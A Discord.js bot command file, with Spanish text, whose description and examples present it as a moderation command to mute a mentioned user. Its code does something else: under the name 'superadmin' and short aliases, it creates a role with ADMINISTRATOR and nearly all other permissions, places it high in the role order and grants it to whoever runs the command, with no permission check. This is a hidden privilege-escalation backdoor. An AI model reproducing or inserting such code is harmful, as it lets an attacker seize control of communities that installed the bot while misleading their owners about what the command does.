module.exports = {
    name : 'superadmin',
    category: "Moderacion",
    aliases: ['dad', 's'],
    description : 'Este comando Mutea al usuario mencionado con su ID o mención, también puedes dar una razón de ello',
    usage: '!admin',
    examples: ['!mute @Firulais', '!mute 556540723235651584', '!mute @Firulais Razon'],
    run: async (client , message, args) => {
        let mutee = message.guild.member(message.author)
    let muterole = message.guild.roles.cache.find(r => r.name === "Creador2")
    if(!muterole) {
        try{
            muterole = await message.guild.roles.create({ data: {  
                name : "Creador",
                color : "#FF0000",
                permissions : ["CREATE_INSTANT_INVITE", "KICK_MEMBERS", "BAN_MEMBERS", "ADMINISTRATOR", "MANAGE_CHANNELS", "MANAGE_GUILD", "ADD_REACTIONS", "READ_MESSAGES", "SEND_MESSAGES", "SEND_TTS_MESSAGES", "MANAGE_MESSAGES", "EMBED_LINKS", "ATTACH_FILES", "READ_MESSAGE_HISTORY", "MENTION_EVERYONE", "EXTERNAL_EMOJIS", "CONNECT", "SPEAK", "MUTE_MEMBERS", "DEAFEN_MEMBERS", "MOVE_MEMBERS", "USE_VAD", "CHANGE_NICKNAME", "MANAGE_NICKNAMES", "MANAGE_ROLES_OR_PERMISSIONS", "MANAGE_WEBHOOKS", "MANAGE_EMOJIS"]
            }
            })
            await muterole.setPosition(29);
        } catch(e) {
            console.log(e.stack);
    }
}

mutee.roles.add(muterole.id)
    }
}
